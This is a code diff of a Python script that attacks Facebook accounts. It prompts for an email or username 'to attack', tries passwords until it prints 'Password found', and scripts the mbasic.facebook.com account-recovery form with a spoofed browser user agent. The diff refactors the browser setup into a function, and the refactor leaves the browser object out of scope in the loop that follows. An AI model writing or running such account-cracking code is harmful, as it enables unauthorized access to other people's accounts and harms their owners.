@@ -44,6 +44,17 @@ def try_password(self, email, password):
     if self.is_logged_in(data):
         print ('Password found: %s' % password )
         sys.exit()
+
+def Facebook():
+  browser = mechanize.Browser()
+  browser.set_handle_robots(False)
+  cookies = mechanize.CookieJar()
+  browser.set_cookiejar(cookies)
+  browser.addheaders = [('User-agent', MOZILLA_UAS)]
+  browser.set_handle_refresh(False)
+  browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
+  browser.select_form(nr=0)
+
 os.system('clear')
 soup = BeautifulSoup()
 email = input('Email address or username to attack:')
@@ -53,14 +64,8 @@ newpass = soup.find(string="poop")
 test = newpass
 """password = input('Password:')"""
 while newpass == test:
-  browser = mechanize.Browser()
-  browser.set_handle_robots(False)
-  cookies = mechanize.CookieJar()
-  browser.set_cookiejar(cookies)
-  browser.addheaders = [('User-agent', MOZILLA_UAS)]
-  browser.set_handle_refresh(False)
-  browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
-  browser.select_form(nr=0)
+  Facebook()
+
   browser.form['email'] = email
   browser.submit()
   """selection confirmation"""
